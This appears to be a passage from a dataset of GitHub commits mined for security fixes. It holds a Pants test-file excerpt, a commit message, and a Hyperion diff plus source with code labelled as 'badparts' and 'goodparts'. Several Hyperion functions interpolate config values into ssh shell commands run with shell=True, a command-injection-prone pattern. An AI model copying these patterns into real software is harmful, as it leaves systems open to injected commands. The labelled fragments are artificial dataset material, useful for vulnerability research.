with temporary_file(root_dir=path) as f:\n        self.assertTrue(os.path.realpath(f.name).startswith(os.path.realpath(path)),\n                        'file should be created in root_dir if specified.')\n\n  def test_temporary_dir_no_args(self):\n    with temporary_dir() as path:\n      self.assertTrue(os.path.exists(path), 'Temporary dir should exist within the context.')\n      self.assertTrue(os.path.isdir(path), 'Temporary dir should be a dir and not a file.')\n    self.assertFalse(os.path.exists(path), 'Temporary dir should not exist outside of the context.')\n\n  def test_temporary_dir_without_cleanup(self):\n    with temporary_dir(cleanup=False) as path:\n      self.assertTrue(os.path.exists(path), 'Temporary dir should exist within the context.')\n    self.assertTrue(os.path.exists(path),\n                    'Temporary dir should exist outside of context if cleanup=False.')\n    shutil.rmtree(path)\n\n  def test_temporary_dir_with_root_dir(self):\n    with temporary_dir() as path1:\n      with temporary_dir(root_dir=path1) as path2:\n        self.assertTrue(os.path.realpath(path2).startswith(os.path.realpath(path1)),\n                        'Nested temporary dir should be created within outer dir.')\n\n  def test_timer(self):\n\n    class FakeClock(object):\n\n      def __init__(self):\n        self._time = 0.0\n\n      def time(self):\n        ret = self._time\n        self._time += 0.0001  # Force a little time to elapse.\n        return ret\n\n      def sleep(self, duration):\n        self._time += duration\n\n    clock = FakeClock()\n\n    # Note: to test with the real system clock, use this instead:\n    # import time\n    # clock = time\n\n    with Timer(clock=clock) as t:\n      self.assertLess(t.start, clock.time())\n      self.assertGreater(t.elapsed, 0)\n      clock.sleep(0.1)\n      self.assertGreater(t.elapsed, 0.1)\n      clock.sleep(0.1)\n      self.assertTrue(t.finish is None)\n    self.assertGreater(t.elapsed, 0.2)\n    self.assertLess(t.finish, clock.time())\n\n  def test_open_zipDefault(self):\n    with temporary_dir() as tempdir:\n      with open_zip(os.path.join(tempdir, 'test'), 'w') as zf:\n        self.assertTrue(zf._allowZip64)\n\n  def test_open_zipTrue(self):\n    with temporary_dir() as tempdir:\n      with open_zip(os.path.join(tempdir, 'test'), 'w', allowZip64=True) as zf:\n        self.assertTrue(zf._allowZip64)\n\n  def test_open_zipFalse(self):\n    with temporary_dir() as tempdir:\n      with open_zip(os.path.join(tempdir, 'test'), 'w', allowZip64=False) as zf:\n        self.assertFalse(zf._allowZip64)\n\n  def test_open_zip_raises_exception_on_falsey_paths(self):\n    falsey = (None, '', False)\n    for invalid in falsey:\n      with self.assertRaises(InvalidZipPath):\n        next(open_zip(invalid).gen)\n\n  def test_open_zip_returns_realpath_on_badzipfile(self):\n    # In case of file corruption, deleting a Pants-constructed symlink would not resolve the error.\n    with temporary_file() as not_zip:\n      with temporary_dir() as tempdir:\n        file_symlink = os.path.join(tempdir, 'foo')\n        os.symlink(not_zip.name, file_symlink)\n        self.assertEqual(os.path.realpath(file_symlink), os.path.realpath(not_zip.name))\n        with self.assertRaisesRegexp(zipfile.BadZipfile, r'{}'.format(not_zip.name)):\n          next(open_zip(file_symlink).gen)\n\n  @contextmanager\n  def _stdio_as_tempfiles(self):\n    \"\"\"Harness to replace `sys.std*` with tempfiles.\n\n    Validates that all files are read/written/flushed correctly, and acts as a\n    contextmanager to allow for recursive tests.\n    \"\"\"\n\n    # Prefix contents written within this instance with a unique string to differentiate\n    # them from other instances.\n    uuid_str = str(uuid.uuid4())\n    def u(string):\n      return '{}#{}'.format(uuid_str, string)\n    stdin_data = u('stdio')\n    stdout_data = u('stdout')\n    stderr_data = u('stderr')\n\n    with temporary_file(binary_mode=False) as tmp_stdin,\\\n         temporary_file(binary_mode=False) as tmp_stdout,\\\n         temporary_file(binary_mode=False) as tmp_stderr:\n      print(stdin_data, file=tmp_stdin)\n      tmp_stdin.seek(0)\n      # Read prepared content from stdin, and write content to stdout/stderr.\n      with stdio_as(stdout_fd=tmp_stdout.fileno(),\n                    stderr_fd=tmp_stderr.fileno(),\n                    stdin_fd=tmp_stdin.fileno()):\n        self.assertEqual(sys.stdin.fileno(), 0)\n        self.assertEqual(sys.stdout.fileno(), 1)\n        self.assertEqual(sys.stderr.fileno(), 2)\n\n        self.assertEqual(stdin_data, sys.stdin.read().strip())\n        print(stdout_data, file=sys.stdout)\n        yield\n        print(stderr_data, file=sys.stderr)\n\n      tmp_stdout.seek(0)\n      tmp_stderr.seek(0)\n      self.assertEqual(stdout_data, tmp_stdout.read().strip())\n      self.assertEqual(stderr_data, tmp_stderr.read().strip())\n\n  def test_stdio_as(self):\n    self.assertTrue(sys.stderr.fileno() > 2,\n                    \"Expected a pseudofile as stderr, got: {}\".format(sys.stderr))\n    old_stdout, old_stderr, old_stdin = sys.stdout, sys.stderr, sys.stdin\n\n    # The first level tests that when `sys.std*` are file-likes (in particular, the ones set up in\n    # pytest's harness) rather than actual files, we stash and restore them properly.\n    with self._stdio_as_tempfiles():\n      # The second level stashes the first level's actual file objects and then re-opens them.\n      with self._stdio_as_tempfiles():\n        pass\n\n      # Validate that after the second level completes, the first level still sees valid\n      # fds on `sys.std*`.\n      self.assertEqual(sys.stdin.fileno(), 0)\n      self.assertEqual(sys.stdout.fileno(), 1)\n      self.assertEqual(sys.stderr.fileno(), 2)\n\n    self.assertEqual(sys.stdout, old_stdout)\n    self.assertEqual(sys.stderr, old_stderr)\n    self.assertEqual(sys.stdin, old_stdin)\n\n  def test_stdio_as_dev_null(self):\n    # Capture output to tempfiles.\n    with self._stdio_as_tempfiles():\n      # Read/write from/to `/dev/null`, which will be validated by the harness as not\n      # affecting the tempfiles.\n      with stdio_as(stdout_fd=-1, stderr_fd=-1, stdin_fd=-1):\n        self.assertEqual('', sys.stdin.read())\n        print('garbage', file=sys.stdout)\n        print('garbage', file=sys.stderr)\n\n  def test_signal_handler_as(self):\n    mock_initial_handler = 1\n    mock_new_handler = 2\n    with mock.patch('signal.signal', **PATCH_OPTS) as mock_signal:\n      mock_signal.return_value = mock_initial_handler\n      try:\n        with signal_handler_as(signal.SIGUSR2, mock_new_handler):\n          raise NotImplementedError('blah')\n      except NotImplementedError:\n        pass\n    self.assertEqual(mock_signal.call_count, 2)\n    mock_signal.assert_has_calls([\n      mock.call(signal.SIGUSR2, mock_new_handler),\n      mock.call(signal.SIGUSR2, mock_initial_handler)\n    ])\n\n  def test_permissions(self):\n    with temporary_file(permissions=0o700) as f:\n      self.assertEqual(0o700, os.stat(f.name)[0] & 0o777)\n\n    with temporary_dir(permissions=0o644) as path:\n      self.assertEqual(0o644, os.stat(path)[0] & 0o777)\n\n  def test_exception_logging(self):\n    fake_logger = mock.Mock()\n\n    with self.assertRaises(AssertionError):\n      with exception_logging(fake_logger, 'error!'):\n        assert True is False\n\n    fake_logger.exception.assert_called_once_with('error!')\n\n  def test_maybe_profiled(self):\n    with temporary_dir() as td:\n      profile_path = os.path.join(td, 'profile.prof')\n\n      with maybe_profiled(profile_path):\n        for _ in range(5):\n          print('test')\n\n      # Ensure the profile data was written.\n      self.assertTrue(os.path.exists(profile_path))\n\n      # Ensure the profile data is valid.\n      pstats.Stats(profile_path).print_stats()\n"}}, "msg": "Fix hermetic environment issues with V2 tasks (#7721)\n\n### Problem\r\n\r\n#### Specific test failures\r\nSeveral of the `util` tests were failing due to issues with using a completely hermetic environment, as follows:\r\n* `test_contextutil.py` assumes that `$USER` is defined in the env, which is not the case in V2.\r\n* `test_dirutil.py` defaulted to using the ASCII codec for its encoding when writing via Python's `open()`, because the environment does not define `LC_ALL` or `LANG`.\r\n* Any test that uses `test_base.py` ends up needing the cryptography wheel. This could not be built properly on macOS environments because the OpenSSL headers were not set up properly.\r\n    * See https://www.pantsbuild.org/howto_contribute.html#getting-pants-source-code for the snippet we tell Pants devs to use.\r\n\r\n#### Way to specify environment variables\r\nThe naive solution to these problems would simply grab the local environment variables for `LC_ALL` / `LANG` and `CPPFLAGS` / `LDFLAGS`. This works during local execution, but presents issues for remote execution where we want to have fine-grained control over the environment.\r\n\r\nSo, we must have some way to hardcode these environment variables via options, while providing sensible defaults that just work in the average case.\r\n\r\nThe greater design question is tracked by https://github.com/pantsbuild/pants/issues/7735.\r\n\r\n### Solution\r\nIntroduce a new idiom of using a `Subsystem` to allow users to have fine-grained control over defining each env var, and then add `datatype`s and rules that compose the individual options into a meaningful set of options that are all required together to achieve the desired behavior.\r\n\r\nFor example, to fix the encoding problem, we need to surface both `LC_ALL` and `LANG` to the `ExecuteProcessRequest`, so, we want a simple way for the code to access those two variables together; the abstraction should be at the level of behavior, not the individual env vars. We also want users to be able to define each individual env var separately, so the external user API should be at the abstraction of an individual env var.\r\n\r\nThis does not close out https://github.com/pantsbuild/pants/issues/7735, as this design is not yet general enough for what we will likely need for future cases. Instead, we try to solve this problem with the minimum diff possible, while getting us closer to the final design."}}, "https://github.com/hyperion-start/hyperion-core": {"269b8c87afc149911af3ae63b3ccbfc77ffb223d": {"url": "https://api.github.com/repos/hyperion-start/hyperion-core/commits/269b8c87afc149911af3ae63b3ccbfc77ffb223d", "html_url": "https://github.com/hyperion-start/hyperion-core/commit/269b8c87afc149911af3ae63b3ccbfc77ffb223d", "sha": "269b8c87afc149911af3ae63b3ccbfc77ffb223d", "keyword": "remote code execution check", "diff": "diff --git a/hyperion/hyperion.py b/hyperion/hyperion.py\nindex 804d071..22fe953 100644\n--- a/hyperion/hyperion.py\n+++ b/hyperion/hyperion.py\n@@ -244,7 +244,13 @@ def start_remote_component(self, comp_name, host):\n     # Check\n     ###################\n     def check_component(self, comp):\n-        return check_component(comp, self.session, self.logger)\n+        if self.run_on_localhost(comp):\n+            return check_component(comp, self.session, self.logger)\n+        else:\n+            self.logger.debug(\"Starting remote check\")\n+            cmd = \"ssh %s 'hyperion --config %s/%s.yaml slave -c'\" % (comp['host'], TMP_SLAVE_DIR, comp['name'])\n+            ret = call(cmd, shell=True)\n+            return CheckState(ret)\n \n     ###################\n     # Dependency management\n@@ -428,9 +434,9 @@ def check_component(comp, session, logger):\n         pids = [p.pid for p in procs]\n         logger.debug(\"Window is running %s child processes\" % len(pids))\n \n-        # Two processes are tee logging\n+        # TODO: Investigate minimum process number on hosts\n         # TODO: Change this when more logging options are introduced\n-        if len(pids) < 3:\n+        if len(pids) < 2:\n             logger.debug(\"Main window process has finished. Running custom check if available\")\n             if check_available and run_component_check(comp):\n                 logger.debug(\"Process terminated but check was successful\")\n@@ -493,7 +499,6 @@ def send_main_session_command(session, cmd):\n     window = find_window(session, \"Main\")\n     window.cmd(\"send-keys\", cmd, \"Enter\")\n \n-\n ###################\n # Logging\n ###################\n", "message": "", "files": {"/hyperion/hyperion.py": {"changes": [{"diff": "\n     # Check\n     ###################\n     def check_component(self, comp):\n-        return check_component(comp, self.session, self.logger)\n+        if self.run_on_localhost(comp):\n+            return check_component(comp, self.session, self.logger)\n+        else:\n+            self.logger.debug(\"Starting remote check\")\n+            cmd = \"ssh %s 'hyperion --config %s/%s.yaml slave -c'\" % (comp['host'], TMP_SLAVE_DIR, comp['name'])\n+            ret = call(cmd, shell=True)\n+            return CheckState(ret)\n \n     ###################\n     # Dependency management\n", "add": 7, "remove": 1, "filename": "/hyperion/hyperion.py", "badparts": ["        return check_component(comp, self.session, self.logger)"], "goodparts": ["        if self.run_on_localhost(comp):", "            return check_component(comp, self.session, self.logger)", "        else:", "            self.logger.debug(\"Starting remote check\")", "            cmd = \"ssh %s 'hyperion --config %s/%s.yaml slave -c'\" % (comp['host'], TMP_SLAVE_DIR, comp['name'])", "            ret = call(cmd, shell=True)", "            return CheckState(ret)"]}, {"diff": "\n         pids = [p.pid for p in procs]\n         logger.debug(\"Window is running %s child processes\" % len(pids))\n \n-        # Two processes are tee logging\n+        # TODO: Investigate minimum process number on hosts\n         # TODO: Change this when more logging options are introduced\n-        if len(pids) < 3:\n+        if len(pids) < 2:\n             logger.debug(\"Main window process has finished. Running custom check if available\")\n             if check_available and run_component_check(comp):\n                 logger.debug(\"Process terminated but check was successful\")\n", "add": 2, "remove": 2, "filename": "/hyperion/hyperion.py", "badparts": ["        if len(pids) < 3:"], "goodparts": ["        if len(pids) < 2:"]}], "source": "\n\nfrom libtmux import Server from yaml import load, dump from setupParser import Loader from DepTree import Node, dep_resolve, CircularReferenceException import logging import os import socket import argparse from psutil import Process from subprocess import call from graphviz import Digraph from enum import Enum from time import sleep import sys from PyQt4 import QtGui import hyperGUI FORMAT=\"%(asctime)s: %(name)s[%(levelname)s]:\\t%(message)s\" logging.basicConfig(level=logging.WARNING, format=FORMAT, datefmt='%I:%M:%S') TMP_SLAVE_DIR=\"/tmp/Hyperion/slave/components\" TMP_COMP_DIR=\"/tmp/Hyperion/components\" TMP_LOG_PATH=\"/tmp/Hyperion/log\" BASE_DIR=os.path.dirname(__file__) SCRIPT_CLONE_PATH=(\"%s/scripts/start_named_clone_session.sh\" % BASE_DIR) class CheckState(Enum): RUNNING=0 STOPPED=1 STOPPED_BUT_SUCCESSFUL=2 STARTED_BY_HAND=3 DEP_FAILED=4 class ControlCenter: def __init__(self, configfile=None): self.logger=logging.getLogger(__name__) self.logger.setLevel(logging.DEBUG) self.configfile=configfile self.nodes={} self.server=[] self.host_list=[] if configfile: self.load_config(configfile) self.session_name=self.config[\"name\"] with open('debug-result.yml', 'w') as outfile: dump(self.config, outfile, default_flow_style=False) self.logger.debug(\"Loading config was successful\") self.server=Server() if self.server.has_session(self.session_name): self.session=self.server.find_where({ \"session_name\": self.session_name }) self.logger.info('found running session by name \"%s\" on server' % self.session_name) else: self.logger.info('starting new session by name \"%s\" on server' % self.session_name) self.session=self.server.new_session( session_name=self.session_name, window_name=\"Main\" ) else: self.config=None def load_config(self, filename=\"default.yaml\"): with open(filename) as data_file: self.config=load(data_file, Loader) def init(self): if not self.config: self.logger.error(\" Config not loaded yet!\") else: for group in self.config['groups']: for comp in group['components']: self.logger.debug(\"Checking component '%s' in group '%s' on host '%s'\" % (comp['name'], group['name'], comp['host'])) if comp['host'] !=\"localhost\" and not self.run_on_localhost(comp): self.copy_component_to_remote(comp, comp['name'], comp['host']) self.host_list=list(set(self.host_list)) self.set_dependencies(True) def set_dependencies(self, exit_on_fail): for group in self.config['groups']: for comp in group['components']: self.nodes[comp['name']]=Node(comp) master_node=Node({'name': 'master_node'}) for name in self.nodes: node=self.nodes.get(name) master_node.addEdge(node) if \"depends\" in node.component: for dep in node.component['depends']: if dep in self.nodes: node.addEdge(self.nodes[dep]) else: self.logger.error(\"Unmet dependency: '%s' for component '%s'!\" %(dep, node.comp_name)) if exit_on_fail: exit(1) self.nodes['master_node']=master_node try: node=self.nodes.get('master_node') res=[] unres=[] dep_resolve(node, res, unres) dep_string=\"\" for node in res: if node is not master_node: dep_string=\"%s -> %s\" %(dep_string, node.comp_name) self.logger.debug(\"Dependency tree for start all: %s\" % dep_string) except CircularReferenceException as ex: self.logger.error(\"Detected circular dependency reference between %s and %s!\" %(ex.node1, ex.node2)) if exit_on_fail: exit(1) def copy_component_to_remote(self, infile, comp, host): self.host_list.append(host) self.logger.debug(\"Saving component to tmp\") tmp_comp_path=('%s/%s.yaml' %(TMP_COMP_DIR, comp)) ensure_dir(tmp_comp_path) with open(tmp_comp_path, 'w') as outfile: dump(infile, outfile, default_flow_style=False) self.logger.debug('Copying component \"%s\" to remote host \"%s\"' %(comp, host)) cmd=(\"ssh %s 'mkdir -p %s' & scp %s %s:%s/%s.yaml\" % (host, TMP_SLAVE_DIR, tmp_comp_path, host, TMP_SLAVE_DIR, comp)) self.logger.debug(cmd) send_main_session_command(self.session, cmd) def stop_component(self, comp): if comp['host'] !='localhost' and not self.run_on_localhost(comp): self.logger.debug(\"Stopping remote component '%s' on host '%s'\" %(comp['name'], comp['host'])) self.stop_remote_component(comp['name'], comp['host']) else: window=find_window(self.session, comp['name']) if window: self.logger.debug(\"window '%s' found running\" % comp['name']) self.logger.info(\"Shutting down window...\") kill_window(window) self.logger.info(\"... done!\") def stop_remote_component(self, comp_name, host): cmd=(\"ssh %s 'hyperion --config %s/%s.yaml slave --kill'\" %(host, TMP_SLAVE_DIR, comp_name)) self.logger.debug(\"Run cmd:\\n%s\" % cmd) send_main_session_command(self.session, cmd) def start_component(self, comp): node=self.nodes.get(comp['name']) res=[] unres=[] dep_resolve(node, res, unres) for node in res: self.logger.debug(\"node name '%s' vs. comp name '%s'\" %(node.comp_name, comp['name'])) if node.comp_name !=comp['name']: self.logger.debug(\"Checking and starting %s\" % node.comp_name) state=self.check_component(node.component) if(state is CheckState.STOPPED_BUT_SUCCESSFUL or state is CheckState.STARTED_BY_HAND or state is CheckState.RUNNING): self.logger.debug(\"Component %s is already running, skipping to next in line\" % comp['name']) else: self.logger.debug(\"Start component '%s' as dependency of '%s'\" %(node.comp_name, comp['name'])) self.start_component_without_deps(node.component) tries=0 while True: self.logger.debug(\"Checking %s resulted in checkstate %s\" %(node.comp_name, state)) state=self.check_component(node.component) if(state is not CheckState.RUNNING or state is not CheckState.STOPPED_BUT_SUCCESSFUL): break if tries > 100: return False tries=tries +1 sleep(.5) self.logger.debug(\"All dependencies satisfied, starting '%s'\" %(comp['name'])) state=self.check_component(node.component) if(state is CheckState.STARTED_BY_HAND or state is CheckState.RUNNING): self.logger.debug(\"Component %s is already running. Skipping start\" % comp['name']) else: self.start_component_without_deps(comp) return True def start_component_without_deps(self, comp): if comp['host'] !='localhost' and not self.run_on_localhost(comp): self.logger.debug(\"Starting remote component '%s' on host '%s'\" %(comp['name'], comp['host'])) self.start_remote_component(comp['name'], comp['host']) else: log_file=(\"%s/%s\" %(TMP_LOG_PATH, comp['name'])) window=find_window(self.session, comp['name']) if window: self.logger.debug(\"Restarting '%s' in old window\" % comp['name']) start_window(window, comp['cmd'][0]['start'], log_file, comp['name']) else: self.logger.info(\"creating window '%s'\" % comp['name']) window=self.session.new_window(comp['name']) start_window(window, comp['cmd'][0]['start'], log_file, comp['name']) def start_remote_component(self, comp_name, host): cmd=(\"ssh %s 'hyperion --config %s/%s.yaml slave'\" %(host, TMP_SLAVE_DIR, comp_name)) self.logger.debug(\"Run cmd:\\n%s\" % cmd) send_main_session_command(self.session, cmd) def check_component(self, comp): return check_component(comp, self.session, self.logger) def get_dep_list(self, comp): node=self.nodes.get(comp['name']) res=[] unres=[] dep_resolve(node, res, unres) res.remove(node) return res def is_localhost(self, hostname): try: hn_out=socket.gethostbyname(hostname) if hn_out=='127.0.0.1' or hn_out=='::1': self.logger.debug(\"Host '%s' is localhost\" % hostname) return True else: self.logger.debug(\"Host '%s' is not localhost\" % hostname) return False except socket.gaierror: sys.exit(\"Host '%s' is unknown! Update your /etc/hosts file!\" % hostname) def run_on_localhost(self, comp): return self.is_localhost(comp['host']) def kill_remote_session_by_name(self, name, host): cmd=\"ssh -t %s 'tmux kill-session -t %s'\" %(host, name) send_main_session_command(self.session, cmd) def start_clone_session(self, comp_name, session_name): cmd=\"%s '%s' '%s'\" %(SCRIPT_CLONE_PATH, session_name, comp_name) send_main_session_command(self.session, cmd) def start_remote_clone_session(self, comp_name, session_name, hostname): remote_cmd=(\"%s '%s' '%s'\" %(SCRIPT_CLONE_PATH, session_name, comp_name)) cmd=\"ssh %s 'bash -s' < %s\" %(hostname, remote_cmd) send_main_session_command(self.session, cmd) def draw_graph(self): deps=Digraph(\"Deps\", strict=True) deps.graph_attr.update(rankdir=\"BT\") try: node=self.nodes.get('master_node') for current in node.depends_on: deps.node(current.comp_name) res=[] unres=[] dep_resolve(current, res, unres) for node in res: if \"depends\" in node.component: for dep in node.component['depends']: if dep not in self.nodes: deps.node(dep, color=\"red\") deps.edge(node.comp_name, dep, \"missing\", color=\"red\") elif node.comp_name is not \"master_node\": deps.edge(node.comp_name, dep) except CircularReferenceException as ex: self.logger.error(\"Detected circular dependency reference between %s and %s!\" %(ex.node1, ex.node2)) deps.edge(ex.node1, ex.node2, \"circular error\", color=\"red\") deps.edge(ex.node2, ex.node1, color=\"red\") deps.view() class SlaveLauncher: def __init__(self, configfile=None, kill_mode=False, check_mode=False): self.kill_mode=kill_mode self.check_mode=check_mode self.logger=logging.getLogger(__name__) self.logger.setLevel(logging.DEBUG) self.config=None self.session=None if kill_mode: self.logger.info(\"started slave with kill mode\") if check_mode: self.logger.info(\"started slave with check mode\") self.server=Server() if self.server.has_session(\"slave-session\"): self.session=self.server.find_where({ \"session_name\": \"slave-session\" }) self.logger.info('found running slave session on server') elif not kill_mode and not check_mode: self.logger.info('starting new slave session on server') self.session=self.server.new_session( session_name=\"slave-session\" ) else: self.logger.info(\"No slave session found on server. Aborting\") exit(CheckState.STOPPED) if configfile: self.load_config(configfile) self.window_name=self.config['name'] self.flag_path=(\"/tmp/Hyperion/slaves/%s\" % self.window_name) self.log_file=(\"/tmp/Hyperion/log/%s\" % self.window_name) ensure_dir(self.log_file) else: self.logger.error(\"No slave component config provided\") def load_config(self, filename=\"default.yaml\"): with open(filename) as data_file: self.config=load(data_file, Loader) def init(self): if not self.config: self.logger.error(\" Config not loaded yet!\") elif not self.session: self.logger.error(\" Init aborted. No session was found!\") else: self.logger.debug(self.config) window=find_window(self.session, self.window_name) if window: self.logger.debug(\"window '%s' found running\" % self.window_name) if self.kill_mode: self.logger.info(\"Shutting down window...\") kill_window(window) self.logger.info(\"... done!\") elif not self.kill_mode: self.logger.info(\"creating window '%s'\" % self.window_name) window=self.session.new_window(self.window_name) start_window(window, self.config['cmd'][0]['start'], self.log_file, self.window_name) else: self.logger.info(\"There is no component running by the name '%s'. Exiting kill mode\" % self.window_name) def run_check(self): if not self.config: self.logger.error(\" Config not loaded yet!\") exit(CheckState.STOPPED.value) elif not self.session: self.logger.error(\" Init aborted. No session was found!\") exit(CheckState.STOPPED.value) check_state=check_component(self.config, self.session, self.logger) exit(check_state.value) def run_component_check(comp): if call(comp['cmd'][1]['check'], shell=True)==0: return True else: return False def check_component(comp, session, logger): logger.debug(\"Running component check for %s\" % comp['name']) check_available=len(comp['cmd']) > 1 and 'check' in comp['cmd'][1] window=find_window(session, comp['name']) if window: pid=get_window_pid(window) logger.debug(\"Found window pid: %s\" % pid) procs=[] for entry in pid: procs.extend(Process(entry).children(recursive=True)) pids=[p.pid for p in procs] logger.debug(\"Window is running %s child processes\" % len(pids)) if len(pids) < 3: logger.debug(\"Main window process has finished. Running custom check if available\") if check_available and run_component_check(comp): logger.debug(\"Process terminated but check was successful\") return CheckState.STOPPED_BUT_SUCCESSFUL else: logger.debug(\"Check failed or no check available: returning false\") return CheckState.STOPPED elif check_available and run_component_check(comp): logger.debug(\"Check succeeded\") return CheckState.RUNNING elif not check_available: logger.debug(\"No custom check specified and got sufficient pid amount: returning true\") return CheckState.RUNNING else: logger.debug(\"Check failed: returning false\") return CheckState.STOPPED else: logger.debug(\"%s window is not running. Running custom check\" % comp['name']) if check_available and run_component_check(comp): logger.debug(\"Component was not started by Hyperion, but the check succeeded\") return CheckState.STARTED_BY_HAND else: logger.debug(\"Window not running and no check command is available or it failed: returning false\") return CheckState.STOPPED def get_window_pid(window): r=window.cmd('list-panes', \"-F return[int(p) for p in r.stdout] def kill_session_by_name(server, name): session=server.find_where({ \"session_name\": name }) session.kill_session() def kill_window(window): window.cmd(\"send-keys\", \"\", \"C-c\") window.kill_window() def start_window(window, cmd, log_file, comp_name): setup_log(window, log_file, comp_name) window.cmd(\"send-keys\", cmd, \"Enter\") def find_window(session, window_name): window=session.find_where({ \"window_name\": window_name }) return window def send_main_session_command(session, cmd): window=find_window(session, \"Main\") window.cmd(\"send-keys\", cmd, \"Enter\") def setup_log(window, file, comp_name): clear_log(file) window.cmd(\"send-keys\", \"exec 2> >(exec tee -i -a '%s')\" % file, \"Enter\") window.cmd(\"send-keys\", \"exec 1> >(exec tee -i -a '%s')\" % file, \"Enter\") window.cmd(\"send-keys\",('echo \" def clear_log(file_path): if os.path.isfile(file_path): os.remove(file_path) def ensure_dir(file_path): directory=os.path.dirname(file_path) if not os.path.exists(directory): os.makedirs(directory) def main(): logger=logging.getLogger(__name__) logger.setLevel(logging.DEBUG) parser=argparse.ArgumentParser() parser.add_argument(\"--config\", '-c', type=str, default='test.yaml', help=\"YAML config file. see sample-config.yaml. Default: test.yaml\") subparsers=parser.add_subparsers(dest=\"cmd\") subparser_editor=subparsers.add_parser('edit', help=\"Launches the editor to edit or create new systems and \" \"components\") subparser_run=subparsers.add_parser('run', help=\"Launches the setup specified by the --config argument\") subparser_val=subparsers.add_parser('validate', help=\"Validate the setup specified by the --config argument\") subparser_remote=subparsers.add_parser('slave', help=\"Run a component locally without controlling it. The \" \"control is taken care of the remote master invoking \" \"this command.\\nIf run with the --kill flag, the \" \"passed component will be killed\") subparser_val.add_argument(\"--visual\", help=\"Generate and show a graph image\", action=\"store_true\") remote_mutex=subparser_remote.add_mutually_exclusive_group(required=False) remote_mutex.add_argument('-k', '--kill', help=\"switch to kill mode\", action=\"store_true\") remote_mutex.add_argument('-c', '--check', help=\"Run a component check\", action=\"store_true\") args=parser.parse_args() logger.debug(args) if args.cmd=='edit': logger.debug(\"Launching editor mode\") elif args.cmd=='run': logger.debug(\"Launching runner mode\") cc=ControlCenter(args.config) cc.init() start_gui(cc) elif args.cmd=='validate': logger.debug(\"Launching validation mode\") cc=ControlCenter(args.config) if args.visual: cc.set_dependencies(False) cc.draw_graph() else: cc.set_dependencies(True) elif args.cmd=='slave': logger.debug(\"Launching slave mode\") sl=SlaveLauncher(args.config, args.kill, args.check) if args.check: sl.run_check() else: sl.init() def start_gui(control_center): app=QtGui.QApplication(sys.argv) main_window=QtGui.QMainWindow() ui=hyperGUI.UiMainWindow() ui.ui_init(main_window, control_center) main_window.show() sys.exit(app.exec_()) ", "sourceWithComments": "#! /usr/bin/env python\nfrom libtmux import Server\nfrom yaml import load, dump\nfrom setupParser import Loader\nfrom DepTree import Node, dep_resolve, CircularReferenceException\nimport logging\nimport os\nimport socket\nimport argparse\nfrom psutil import Process\nfrom subprocess import call\nfrom graphviz import Digraph\nfrom enum import Enum\nfrom time import sleep\n\nimport sys\nfrom PyQt4 import QtGui\nimport hyperGUI\n\nFORMAT = \"%(asctime)s: %(name)s [%(levelname)s]:\\t%(message)s\"\n\nlogging.basicConfig(level=logging.WARNING, format=FORMAT, datefmt='%I:%M:%S')\nTMP_SLAVE_DIR = \"/tmp/Hyperion/slave/components\"\nTMP_COMP_DIR = \"/tmp/Hyperion/components\"\nTMP_LOG_PATH = \"/tmp/Hyperion/log\"\n\nBASE_DIR = os.path.dirname(__file__)\nSCRIPT_CLONE_PATH = (\"%s/scripts/start_named_clone_session.sh\" % BASE_DIR)\n\n\nclass CheckState(Enum):\n    RUNNING = 0\n    STOPPED = 1\n    STOPPED_BUT_SUCCESSFUL = 2\n    STARTED_BY_HAND = 3\n    DEP_FAILED = 4\n\n\nclass ControlCenter:\n\n    def __init__(self, configfile=None):\n        self.logger = logging.getLogger(__name__)\n        self.logger.setLevel(logging.DEBUG)\n        self.configfile = configfile\n        self.nodes = {}\n        self.server = []\n        self.host_list = []\n\n        if configfile:\n            self.load_config(configfile)\n            self.session_name = self.config[\"name\"]\n\n            # Debug write resulting yaml file\n            with open('debug-result.yml', 'w') as outfile:\n                dump(self.config, outfile, default_flow_style=False)\n            self.logger.debug(\"Loading config was successful\")\n\n            self.server = Server()\n\n            if self.server.has_session(self.session_name):\n                self.session = self.server.find_where({\n                    \"session_name\": self.session_name\n                })\n\n                self.logger.info('found running session by name \"%s\" on server' % self.session_name)\n            else:\n                self.logger.info('starting new session by name \"%s\" on server' % self.session_name)\n                self.session = self.server.new_session(\n                    session_name=self.session_name,\n                    window_name=\"Main\"\n                )\n        else:\n            self.config = None\n\n    ###################\n    # Setup\n    ###################\n    def load_config(self, filename=\"default.yaml\"):\n        with open(filename) as data_file:\n            self.config = load(data_file, Loader)\n\n    def init(self):\n        if not self.config:\n            self.logger.error(\" Config not loaded yet!\")\n\n        else:\n            for group in self.config['groups']:\n                for comp in group['components']:\n                    self.logger.debug(\"Checking component '%s' in group '%s' on host '%s'\" %\n                                      (comp['name'], group['name'], comp['host']))\n\n                    if comp['host'] != \"localhost\" and not self.run_on_localhost(comp):\n                        self.copy_component_to_remote(comp, comp['name'], comp['host'])\n\n            # Remove duplicate hosts\n            self.host_list = list(set(self.host_list))\n\n            self.set_dependencies(True)\n\n    def set_dependencies(self, exit_on_fail):\n        for group in self.config['groups']:\n            for comp in group['components']:\n                self.nodes[comp['name']] = Node(comp)\n\n        # Add a pseudo node that depends on all other nodes, to get a starting point to be able to iterate through all\n        # nodes with simple algorithms\n        master_node = Node({'name': 'master_node'})\n        for name in self.nodes:\n            node = self.nodes.get(name)\n\n            # Add edges from each node to pseudo node\n            master_node.addEdge(node)\n\n            # Add edges based on dependencies specified in the configuration\n            if \"depends\" in node.component:\n                for dep in node.component['depends']:\n                    if dep in self.nodes:\n                        node.addEdge(self.nodes[dep])\n                    else:\n                        self.logger.error(\"Unmet dependency: '%s' for component '%s'!\" % (dep, node.comp_name))\n                        if exit_on_fail:\n                            exit(1)\n        self.nodes['master_node'] = master_node\n\n        # Test if starting all components is possible\n        try:\n            node = self.nodes.get('master_node')\n            res = []\n            unres = []\n            dep_resolve(node, res, unres)\n            dep_string = \"\"\n            for node in res:\n                if node is not master_node:\n                    dep_string = \"%s -> %s\" % (dep_string, node.comp_name)\n            self.logger.debug(\"Dependency tree for start all: %s\" % dep_string)\n        except CircularReferenceException as ex:\n            self.logger.error(\"Detected circular dependency reference between %s and %s!\" % (ex.node1, ex.node2))\n            if exit_on_fail:\n                exit(1)\n\n    def copy_component_to_remote(self, infile, comp, host):\n        self.host_list.append(host)\n\n        self.logger.debug(\"Saving component to tmp\")\n        tmp_comp_path = ('%s/%s.yaml' % (TMP_COMP_DIR, comp))\n        ensure_dir(tmp_comp_path)\n        with open(tmp_comp_path, 'w') as outfile:\n            dump(infile, outfile, default_flow_style=False)\n\n        self.logger.debug('Copying component \"%s\" to remote host \"%s\"' % (comp, host))\n        cmd = 